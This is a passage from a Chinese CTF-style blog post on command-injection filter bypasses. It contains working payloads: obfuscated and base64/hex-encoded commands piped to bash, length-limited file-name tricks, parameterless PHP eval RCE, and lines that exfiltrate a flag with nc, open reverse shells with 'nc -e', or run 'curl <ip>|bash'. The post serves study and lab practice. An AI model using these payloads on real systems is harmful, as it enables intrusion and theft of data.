+</code></pre><button class="code-block-unfold-btn"></button></div><p><strong>4.url编码 %09（TAB），%20（space）；</strong></p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>?cmd=cat%09flag.php
+</code></pre><button class="code-block-unfold-btn"></button></div><hr><h3 id="文件名过滤绕过" tabindex="-1">文件名过滤绕过 <a class="header-anchor" href="#文件名过滤绕过" aria-label="Permalink to &quot;文件名过滤绕过&quot;">​</a></h3><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404231519432.png" alt="image-20240423151936357" loading="lazy" decoding="async"></figure><p><strong>绕过方法</strong></p><p>*<em>1.通配符？<em>绕过</em></em></p><p>通配符是一种特殊语句，主要有问号和星号，用来模糊搜索文件</p><p>?在linux里面可以进行代替字母。？仅代表単个字符串，但此单字必须存在</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>#cat fl?g.tx?
+</code></pre><button class="code-block-unfold-btn"></button></div><p>*在linux里面可以进行模糊匹配。*可以代表任何字符串</p><p><strong>2.単引号，双引号绕过</strong></p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>system(&#39;cat fl&quot;&quot;ag.p&quot;&quot;hp&#39;);
+外单内双，外双内単
+</code></pre><button class="code-block-unfold-btn"></button></div><p><strong>3.反斜杠\绕过</strong></p><p>把特殊字符去掉功能性，单纯表示为字符串</p><p>system(‘cat fl\ag.p\hp’);</p><p>4.*<em>特殊变量：$1到$9、$@和$<em>等</em></em></p><p>输出为空</p><p>cat fl$1ag.t$9xt</p><p><strong>5.内联执行</strong></p><p>自定义字符串，再拼接起来</p><p>a=f;d=ag;c=l;cat$a$c$d.txt</p><p><strong>6.利用linux中的环境变量</strong></p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241718857.png" alt="image-20240424171843635" loading="lazy" decoding="async"></figure><hr><h3 id="常见文件读取命令绕过" tabindex="-1">常见文件读取命令绕过 <a class="header-anchor" href="#常见文件读取命令绕过" aria-label="Permalink to &quot;常见文件读取命令绕过&quot;">​</a></h3><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>more:一页一页的显示档案内容
+less:与 more 类似 head:查看头几行
+tac:从最后一行开始显示，可以看出 tac 是cat 的反向显示
+tail:查看尾几行
+nl：显示的时候，顺便输出行号,跟cat功能类似
+od:以二进制的方式读取档案内容
+vi:一种编辑器，这个也可以查看
+vim:一种编辑器，这个也可以查看
+sort:可以查看，用于排序文件
+passthru(&quot;/usr/bin/s?rt&quot; fl\ag.p\hp)
+uniq:可以查看报告或删除文件中重复的文件
+file -f:报错出具体内容 
+grep 在文件中查找某些字符串
+1、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings
+2.查找flag：?cmd=passthru(&quot;grep fla fla*&quot;) 从fla*文件中查找包含fla的字符串
+</code></pre><button class="code-block-unfold-btn"></button></div><h3 id="编码绕过" tabindex="-1">编码绕过 <a class="header-anchor" href="#编码绕过" aria-label="Permalink to &quot;编码绕过&quot;">​</a></h3><p><strong>绕过方法</strong></p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241758202.png" alt="image-20240424175819140" loading="lazy" decoding="async"></figure><p>1.base64编码</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>import base64
+s=b&#39;cat flag.php&#39;
+e64=base64.b64encode(s) 参数s的类型不必须是字节包
+print（e64）
+
+#echo Y2FOIGZsYWcucGhw|base64 -d
+|把前面指令执行的结果变成后面指令的参数
+
+执行命令
+#echo Y2FOIGZsYWcucGhw|base64 |bash
+#`echo Y2FOIGZsYWcucGhw|base64`
+#$(echo Y2FOIGZsYWcucGhw|base64)
+</code></pre><button class="code-block-unfold-btn"></button></div><p>2.base32编码</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>import base64
+s=b&#39;cat flag.php&#39;
+e64=base64.b32encode(s) 参数s的类型不必须是字节包
+print（e64）
+
+?cmd=system(&#39;echo&quot;MNQXIIDGNRQWOLTQNBYA====&quot;|base32 -d|/bin/bash&#39;);
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>base32和Base64的区分方法 看到编码内容，只有大写和数字 根据Base64和Base32 区别： base64中包含大写字母（A-Z），小写字母（a-z），数字0—9以及+/； base32中只包含大写字母（A-Z）和数字234567</p><p>3.hex编码</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>import binascii
+s=b&#39;tac flag&#39;
+h=binascii.b2a_hex(s)
+print(h) 
+
+执行命令
+echo “ ”|xxd -r -p |bash
+xxd 二进制显示和处理文件工具
+-r -p将纯十六进制转储的反向输出打印为了ascll格式
+bash也可换成sh、/bin/bash、反引号
+</code></pre><button class="code-block-unfold-btn"></button></div><p>4.shellcode编码</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>将ascll码前加\x
+用print打印 //echo 无法执行
+?cmd=passthru(&quot;print&#39;shellcode编码&#39;|bash&quot;)
+</code></pre><button class="code-block-unfold-btn"></button></div><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241816512.png" alt="image-20240424181629448" loading="lazy" decoding="async"></figure><hr><h3 id="无回显时间盲注" tabindex="-1">无回显时间盲注 <a class="header-anchor" href="#无回显时间盲注" aria-label="Permalink to &quot;无回显时间盲注&quot;">​</a></h3><p>页面无法shell反弹或者无法回显，或者没有权限，可尝试命令盲注</p><p>更具返回的时间来进行判断</p><p>读取文件指定行的指定位置的字符</p><p>相关命令</p><p><strong>1.sleep</strong></p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>sleep 5  5秒后返回结果
+</code></pre><button class="code-block-unfold-btn"></button></div><p><strong>2.cat+awk</strong> NR awk逐行获取数据</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241956456.png" alt="image-20240424195618422" loading="lazy" decoding="async"></figure><p><strong>3.cut -c</strong> cut 命令逐列获取単个字符</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241958280.png" alt="image-20240424195850245" loading="lazy" decoding="async"></figure><p><strong>4.if判断命令是否执行</strong></p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241959619.png" alt="image-20240424195930570" loading="lazy" decoding="async"></figure><p>5.<strong>脚本</strong></p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404251351441.png" alt="image-20240425135138314" loading="lazy" decoding="async"></figure><h3 id="长度过滤绕过" tabindex="-1">长度过滤绕过 <a class="header-anchor" href="#长度过滤绕过" aria-label="Permalink to &quot;长度过滤绕过&quot;">​</a></h3><h4 id="相关命令" tabindex="-1"><strong>相关命令</strong> <a class="header-anchor" href="#相关命令" aria-label="Permalink to &quot;**相关命令**&quot;">​</a></h4><h5 id="_1-和-符号" tabindex="-1"><strong>1.&gt;和&gt;&gt;符号</strong> <a class="header-anchor" href="#_1-和-符号" aria-label="Permalink to &quot;**1.&gt;和&gt;&gt;符号**&quot;">​</a></h5><p>1）<strong>通过&gt;来创建文件</strong></p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>echo benben&gt;a
+</code></pre><button class="code-block-unfold-btn"></button></div><p>创建文件a，</p><p>并把字符串‘benben’写入到文件a里面；</p><p><strong>注意</strong>：通过&gt;来讲命令执行结果写入文件会覆盖掉文件原本的内容</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>echo dazhuang&gt;a
+</code></pre><button class="code-block-unfold-btn"></button></div><p>a中的内容就会由benben变为dazhuang</p><p>单独使用&gt;,会直接创建文件b</p><p>2）<strong>通过&gt;&gt;来追加内容</strong></p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>echo benben&gt;&gt;a
+</code></pre><button class="code-block-unfold-btn"></button></div><p>在原本文件内容后面追加“benben”</p><h5 id="_2-命令换行" tabindex="-1"><strong>2.命令换行</strong> <a class="header-anchor" href="#_2-命令换行" aria-label="Permalink to &quot;**2.命令换行**&quot;">​</a></h5><p>在没有写完的命令后面加“\”，可以将一条命令写在多行：</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>#cat a
+
+#c\
+a\
+t\
+a
+</code></pre><button class="code-block-unfold-btn"></button></div><p>相当于\把换行的命令连接到一起执行</p><h5 id="_3-ls-t命令" tabindex="-1"><strong>3. ls -t命令</strong> <a class="header-anchor" href="#_3-ls-t命令" aria-label="Permalink to &quot;**3. ls -t命令**&quot;">​</a></h5><p>将文件名按照时间顺序排列出来（后创建的排在前面）</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>ls
+a b c
+</code></pre><button class="code-block-unfold-btn"></button></div><p>按字母顺序显示文件名</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>ls -t
+b c a
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>按时间顺序显示文件名（后创建的排在前面）</p><p><em>只能精确到秒</em></p><h5 id="_4-组合运用" tabindex="-1"><strong>4.组合运用</strong> <a class="header-anchor" href="#_4-组合运用" aria-label="Permalink to &quot;**4.组合运用**&quot;">​</a></h5><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404251416193.png" alt="image-20240425141609130" loading="lazy" decoding="async"></figure><p><strong>执行文件方法</strong></p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>.a或者sh a
+执行命令从标准输入读取或从一个文件中读取
+</code></pre><button class="code-block-unfold-btn"></button></div><blockquote><p>对命令长度有限制时</p><p>把一些很短的文件名拼接成可执行命令</p><p>&gt;创建很短的的文件名</p><p>ls -t按时间顺序列出文件名，按行储存</p><p>\连接换行命令</p><p>sh从文件中读取命令</p></blockquote><h5 id="_5-dir及-和rev" tabindex="-1"><strong>5.dir及*和rev</strong> <a class="header-anchor" href="#_5-dir及-和rev" aria-label="Permalink to &quot;**5.dir及*和rev**&quot;">​</a></h5><p><strong>dir</strong>：基本上和ls一样，但有两个好处</p><p>一是开头字母是d，这使得它在alphabetical序中靠前；</p><p>二是按列输出，不换行</p><p>*****:相当于$(dir *)</p><p>把文件名组合在一起当作命令执行</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404251436045.png" alt="image-20240425143604984" loading="lazy" decoding="async"></figure><p><strong>rev</strong>：可以反转文件的每一行内容</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>cat flag
+123456
+
+rev flag
+654321
+</code></pre><button class="code-block-unfold-btn"></button></div><hr><h4 id="长度限制为7的绕过方法" tabindex="-1">长度限制为7的绕过方法 <a class="header-anchor" href="#长度限制为7的绕过方法" aria-label="Permalink to &quot;长度限制为7的绕过方法&quot;">​</a></h4><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404251500945.png" alt="image-20240425150059857" loading="lazy" decoding="async"></figure><p>思路：1.先寻找期望执行的命令</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>cat flag|nc 192.168.1.161 7777
+</code></pre><button class="code-block-unfold-btn"></button></div><p>kail的ip地址192.168.1.161</p><p>监听端口7777</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>方法
+nc -lvp 7777
+</code></pre><button class="code-block-unfold-btn"></button></div><p>通过cat flag展示内容，再通过nc反弹，提交到192.168.1.161:777，最后通过监听端口获得内容</p><p>用以下方法进行拼接</p><blockquote><p>&gt;创建很短的的文件名</p><p>ls -t按时间顺序列出文件名，按行储存</p><p>\连接换行命令</p><p>sh从文件中读取命令</p></blockquote><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404251506528.png" alt="image-20240425150646487" loading="lazy" decoding="async"></figure><p>最后用sh a执行命令</p><p><strong>nc反弹shell</strong></p><p><strong>在 Kali Linux 上监听连接</strong></p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>nc -lvp &lt;监听端口&gt;
+</code></pre><button class="code-block-unfold-btn"></button></div><p><strong>在目标主机上发起连接请求</strong></p><p>linux</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>nc -e /bin/bash &lt;kali的IP&gt; &lt;kali监听端口&gt;
+</code></pre><button class="code-block-unfold-btn"></button></div><p>windows</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>nc -e cmd.exe &lt;kali的IP&gt; &lt;kali监听端口&gt;
+</code></pre><button class="code-block-unfold-btn"></button></div><hr><h4 id="长度限制为5的绕过方法" tabindex="-1">长度限制为5的绕过方法 <a class="header-anchor" href="#长度限制为5的绕过方法" aria-label="Permalink to &quot;长度限制为5的绕过方法&quot;">​</a></h4><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405071406094.png" alt="image-20240507140631920" loading="lazy" decoding="async"></figure><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>ls -t&gt;a
+字符串长度为7，超过限制5
+
+&gt;\ \\
+构造空格的字符串长度最少为5，超过一个空格便无法构造
+
+长度限制为7时的命令不再适用
+</code></pre><button class="code-block-unfold-btn"></button></div><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404271923282.png" alt="image-20240427192327068" loading="lazy" decoding="async"></figure><p><strong>构建命令</strong></p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>期望执行的命令
+curl 192.168.1.161|bash
+</code></pre><button class="code-block-unfold-btn"></button></div><p><strong>步骤一</strong>：构造ls-t&gt;y</p><p>ls默认排序无法正常排出“ls\”“&quot;”-t&quot;&quot;&gt;y&quot;</p><p>&quot;ls&quot;默认会排在最后，无法正常执行命令的</p><p>所以：我们先创建文件ls\</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>&gt;ls\
+</code></pre><button class="code-block-unfold-btn"></button></div><p>在创建文件&quot;_&quot;，并把“ls\”写入</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>ls&gt;_
+</code></pre><button class="code-block-unfold-btn"></button></div><p>再创建其他文件</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>&gt;\ \\
+&gt;-t\\
+&gt;\&gt;y
+</code></pre><button class="code-block-unfold-btn"></button></div><p>用&gt;&gt;把所有文件名追加到文件_</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>ls&gt;&gt;_
+</code></pre><button class="code-block-unfold-btn"></button></div><p>最后sh_执行文件_中的内容，即创建文件y</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>sh_
+</code></pre><button class="code-block-unfold-btn"></button></div><p>**步骤二：**分解命令，创建文件</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404271953465.png" alt="image-20240427195355410" loading="lazy" decoding="async"></figure><p><strong>步骤三</strong>：执行脚本sh</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>sh y
+</code></pre><button class="code-block-unfold-btn"></button></div><p>执行命令curl 192.168.1.161|bash</p><p>反弹shell</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404272001638.png" alt="image-20240427200103558" loading="lazy" decoding="async"></figure><hr><h4 id="长度限制为4的绕过方法" tabindex="-1">长度限制为4的绕过方法 <a class="header-anchor" href="#长度限制为4的绕过方法" aria-label="Permalink to &quot;长度限制为4的绕过方法&quot;">​</a></h4><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>ls&gt;&gt;_
+追加命令长度最少为5，超过4个，不再适用
+</code></pre><button class="code-block-unfold-btn"></button></div><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405071410666.png" alt="image-20240507141056579" loading="lazy" decoding="async"></figure><p>步骤一：构造ls -t&gt;g</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>&gt;g\;
+&gt;g\&gt;
+&gt;ht-
+&gt;sl
+&gt;dir
+*&gt;v
+&gt;rev
+*v&gt;x
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>步骤二：构造一个反弹的shell</p><p>ip地址用16进制表示</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>&gt;ash
+&gt;b\
+&gt;\|\
+&gt;A1\
+&gt;01\
+&gt;A8\
+&gt;c0&gt;
+&gt;0x\
+&gt;\\
+&gt;rl\
+&gt;cu\
+sh x
+sh g
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>步骤三：开启http.server监听80端口</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>#python -m http.server 80
+</code></pre><button class="code-block-unfold-btn"></button></div><p>步骤四：执行脚本</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>#python poc4.py
+</code></pre><button class="code-block-unfold-btn"></button></div><h3 id="无参数命令执行请求头绕过" tabindex="-1">无参数命令执行请求头绕过 <a class="header-anchor" href="#无参数命令执行请求头绕过" aria-label="Permalink to &quot;无参数命令执行请求头绕过&quot;">​</a></h3><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405071943478.png" alt="image-20240507194352410" loading="lazy" decoding="async"></figure><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code> preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, $_GET[&#39;exp&#39;])
+只要在exp里匹配到[^\W]+\((?R)?\) 则替换为空
+
+[^\W]+\((?R)?\)
+正则表达式[^\W]匹配字母、数字、下划线（如果在方括号的前面写上一个^,则代表要求匹配出了尖号后面列出的以外的字符）
+[^\W]+\(?\)匹配到‘a()’形式的字符串，但是（）不能出现任何参数
+(?R)代表递归，即a(b(c()))都能匹配到
+</code></pre><button class="code-block-unfold-btn"></button></div><p><strong>HTTP请求标头</strong></p><p><strong>getallheaders()</strong></p><p>获取所有请求标头(跟抓包内容是反着的)</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>?code=print_r(getallheaders());
+</code></pre><button class="code-block-unfold-btn"></button></div><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405072009305.png" alt="image-20240507200954233" loading="lazy" decoding="async"></figure><p>pos()把第一项内容的值显示出来</p><p>或end()把最后一项内容的值显示出来</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>?code=print_r(pos(getallheaders())); pos拿到的的getallheaders显示的第一个
+?code=print_r(end(getallheaders())); end拿到的的getallheaders显示的最后一个
+</code></pre><button class="code-block-unfold-btn"></button></div><p>把print_r改为eval就能执行命令了</p><p><strong>apache_request_headers()</strong></p><p>功能与getallheaders()相似，适用于apache服务器</p><hr><h3 id="无参数全局变量rce" tabindex="-1">无参数全局变量RCE <a class="header-anchor" href="#无参数全局变量rce" aria-label="Permalink to &quot;无参数全局变量RCE&quot;">​</a></h3><p>get_defined_vars()</p><p>返回所有已定义变量的值所组成的数组</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>?code=print_r(get_defined_vars));
+返回数组顺序为GET-&gt;POST-&gt;COOKIE-&gt;FILES
+?code=print_r(end(pos(get_defined_vars())));&amp;cmd=system(&#39;ls&#39;);
+&amp;加入想要获取的命令
+把print_r换成eval，assert即可
+end获取GET的最后一项cmd的值system(&#39;ls&#39;)
+</code></pre><button class="code-block-unfold-btn"></button></div><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>var_dump(scandir(current(localeconv())));
+
+查看当前目录下的文件
+
+localeconv() 函数返回当前设置的地区的格式化信息，包括货币符号、小数点符号等。它返回一个数组，其中包含了与当前地区相关的格式化参数，该函数返回的第一个元素的值通常是小数点 “.” 。
+
+current() 函数用于获取数组中的当前元素的值。在这里，它用于获取 localeconv() 函数返回的数组的第一个元素的值，即一个小数点。
+
+scandir() 函数用于获取指定目录中的文件和文件夹列表。它接受一个路径作为参数，并返回一个包含指定目录中所有文件和文件夹的数组。scandir(&quot;.&quot;) 表示获取当前目录下的文件列表。
+
+最后使用 var_dump() 函数将该列表输出到页面上。
+</code></pre><button class="code-block-unfold-btn"></button></div><h3 id="无参数命令执行session" tabindex="-1">无参数命令执行session <a class="header-anchor" href="#无参数命令执行session" aria-label="Permalink to &quot;无参数命令执行session&quot;">​</a></h3><p>使用条件：php7以下</p><p>session_start()</p><p>启动新会话或者重用现有会话，成功开始会话返回true，反之返回false</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>?code=print_r(session_start());
+
+返回1
+
+?code=print_r(session_id(session_start()))
+返回PHPSESSID的值
+可以通过bp修改它
+</code></pre><button class="code-block-unfold-btn"></button></div><p>print_r修改为show_source(session_id(session_start))</p><p>用show_source读取flag文件源代码</p><p>修改外部函数为eval()</p><p>修改PHPSESSID为‘phpinfo();’</p><p>但无法直接执行，需要把phpinfo();改为hex编码后再用hex2bin()函数将16进制转为2进制，才可用eval执行</p><!--]--><!--]--><!----><!----></article><!--]--><!--[--><!--[--><!--[--><!----><ul class="post-copyright" m="y-4"><li class="post-copyright-author"><strong>本文作者：</strong><span>北歌</span></li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://kinsey973.github.io/posts/%25E5%2591%25BD%25E4%25BB%25A4%25E6%2589%25A7%25E8%25A1%258C" target="_blank" title="本文链接">https://kinsey973.github.io/posts/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C</a></li><li class="post-copyright-license"><strong>版权声明：</strong><span>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 ">CC BY-NC-SA</a> 许可协议。</span></li></ul><!--]--><!--]--><!--]--></div><!--]--></div><!----></div><!--[--><!--]--><!--[--><div class="post-nav"><div class="post-nav-item"><a href="/posts/%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596" class="post-nav-prev" title="反序列化"><div class="icon" i-ri-arrow-left-s-line></div><span class="title truncate" text="sm">反序列化</span></a></div><div class="post-nav-item"><a href="/posts/ctfshow-%25E5%2591%25BD%25E4%25BB%25A4%25E6%2589%25A7%25E8%25A1%258C" class="post-nav-next" title="ctfshow 命令执行"><span class="title truncate" text="sm">ctfshow 命令执行</span><div class="icon" i-ri-arrow-right-s-line></div></a></div></div><!--]--><!--[--><!--]--><!--[--><div class="yun-card flex-center rounded-2 overflow-hidden comment yun-comment sm:p-6 lg:px-12 xl:px-16" flex="col" min-h="100px" bg="$va-c-bg-light" w="full" p="4"><!----><!----><div class="yun-card-body relative" w="full" flex="~ col" items="center"><!--[--><!----><!--]--></div><!----></div><!--]--><template class="mt-4 lg:hidden"></template><!--[--><!--]--><!--[--><!--]--></div><!--]--></main><!--[--><button class="xl:hidden toc-btn shadow-md fixed yun-icon-btn z-20 bg-$va-c-bg-soft" opacity="75" right="4" bottom="19"><div i-ri-file-list-line></div></button><!----><aside flex="~ col" class="va-card yun-aside min-h-sm rounded-2" text="center" overflow="auto"><div class="w-full" flex="~ col" pb-2><!--[--><h2 m="t-6 b-2" font="serif black">文章目录</h2><div style="display:none;" data-v-d9db7c40><div class="content" data-v-d9db7c40><div class="outline-title" data-v-d9db7c40>本页</div><div class="outline-marker" data-v-d9db7c40></div><nav aria-labelledby="doc-outline-aria-label" data-v-d9db7c40><span id="doc-outline-aria-label" class="visually-hidden" data-v-d9db7c40> Table of Contents for current page </span><ul class="root va-toc relative z-1 css-i18n-toc" data-v-d9db7c40 data-v-0a3661f1><!--[--><!--]--></ul></nav></div></div><!--]--><div class="flex-grow"></div><!----></div></aside><!--]--><!--]--></div><footer flex="~ col" class="relative yun-footer va-footer px-4 py-4 pt-0 text-$va-c-text-light w-full mt-14" bg="white dark:$va-c-bg-soft" text="center sm"><div class="yun-cloud absolute top--10 left-0 right-0"><svg class="waves" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" fill="var(--yun-c-cloud)"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><!----><div class="copyright flex justify-center items-center gap-2" p="1"><span> © <!--[-->2023 - <!--]--> 2026</span><a class="animate-pulse inline-flex" href="https://www.yunyoujun.cn/sponsors/" target="_blank" title="Sponsor YunYouJun"><div class="i-ri-cloud-line"></div></a><span>北歌</span></div><div class="powered" m="2"><span>由 <a href="https://github.com/YunYouJun/valaxy.git" target="_blank" rel="noopener">Valaxy</a> <span class="op-60">v0.28.7</span> 驱动</span><span mx-1>|</span><span><span>主题</span><span mx-1>-</span><a href="https://github.com/YunYouJun/valaxy/tree/main/packages/valaxy-theme-yun.git" title="valaxy-theme-yun" target="_blank">Yun</a><span class="ml-1 op-60">v0.28.7</span></span></div><!--[--><div>本站总访问量 <span id="busuanzi_value_site_pv"></span> 次</div><div>本站访客数 <span id="busuanzi_value_site_uv"></span> 人次</div><!--]--><div class="yun-footer-gradient"></div></footer></div><!--]--></div><script>window.__INITIAL_STATE__='{"pinia":{"yun-app":{"bannerAnimationDone":false},"app":{"showLoading":true},"site":{},"routerStore":{}}}'</script><script type="application/ld+json" data-hid="schema-org-graph">{"@context":"https://schema.org","@graph":[{"@id":"https://kinsey973.github.io/#identity","@type":"Person","name":"北歌","url":"https://kinsey973.github.io/","image":{"@id":"https://kinsey973.github.io/#/schema/image/1"},"sameAs":["/atom.xml","https://music.163.com/#/user/home?id=3954596483","https://qm.qq.com/cgi-bin/qm/qr?k=kZJzggTTCf4SpvEQ8lXWoi5ZjhAx0ILZ&jump_from=webapi","https://github.com/kinsey973","https://travellings.link"]},{"@id":"https://kinsey973.github.io/#website","@type":"WebSite","dateModified":"2024-10-08T20:12:51.000Z","datePublished":"2024-10-08T20:12:51.000Z","inLanguage":"zh-CN","name":"命令执行","url":"https://kinsey973.github.io/","publisher":{"@id":"https://kinsey973.github.io/#identity"}},{"@id":"https://kinsey973.github.io/#webpage","@type":"WebPage","dateModified":"2024-10-08T20:12:51.000Z","datePublished":"2024-10-08T20:12:51.000Z","description":"山行野宿，孤身万里","name":"命令执行","url":"https://kinsey973.github.io/","about":{"@id":"https://kinsey973.github.io/#identity"},"isPartOf":{"@id":"https://kinsey973.github.io/#website"},"potentialAction":[{"@type":"ReadAction","target":["https://kinsey973.github.io/"]}]},{"@id":"https://kinsey973.github.io/#article","dateModified":"2024-10-08T20:12:51.000Z","datePublished":"2024-10-08T20:12:51.000Z","description":"山行野宿，孤身万里","headline":"命令执行","inLanguage":"zh-CN","thumbnailUrl":"https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404152203957.png","@type":["Article","BlogPosting"],"author":{"@id":"https://kinsey973.github.io/#/schema/person/1"},"image":{"@id":"https://kinsey973.github.io/#/schema/image/2"},"isPartOf":{"@id":"https://kinsey973.github.io/#webpage"},"mainEntityOfPage":{"@id":"https://kinsey973.github.io/#webpage"},"publisher":{"@id":"https://kinsey973.github.io/#identity"}},{"@id":"https://kinsey973.github.io/#/schema/person/1","@type":"Person","name":"北歌","url":"https://valaxy.site"},{"@id":"https://kinsey973.github.io/#/schema/image/1","@type":"ImageObject","contentUrl":"https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410261321057.png","inLanguage":"zh-CN","url":"https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410261321057.png"},{"@id":"https://kinsey973.github.io/#/schema/image/2","@type":"ImageObject","contentUrl":"https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404152203957.png","inLanguage":"zh-CN","url":"https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404152203957.png"}]}</script>
+  
+</body>
+</html>
